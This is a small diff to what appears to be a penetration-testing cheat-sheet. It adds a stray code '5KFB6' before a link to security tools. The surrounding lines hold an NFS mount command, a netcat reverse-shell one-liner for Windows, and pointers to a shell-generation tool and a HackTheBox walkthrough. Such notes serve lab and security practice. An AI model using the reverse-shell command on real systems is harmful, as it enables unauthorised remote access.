@@ -35,7 +35,7 @@ mount -t nfs <ip>:/<mount-folder> /tmp/<foldername>
 
 Netcat reverse shell \(after uploading the binary!\): `nc64.exe -e cmd <ip port>`
 
-tools: [https://specterops.io/resources/research-and-development](https://specterops.io/resources/research-and-development)
+5KFB6 tools: [https://specterops.io/resources/research-and-development](https://specterops.io/resources/research-and-development)
 
 easy windows shell: unicorn.py [trustedsec/unicorn](https://github.com/trustedsec/unicorn) [HackTheBox - Arctic](https://www.youtube.com/watch?v=e9lVyFH7-4o)
 
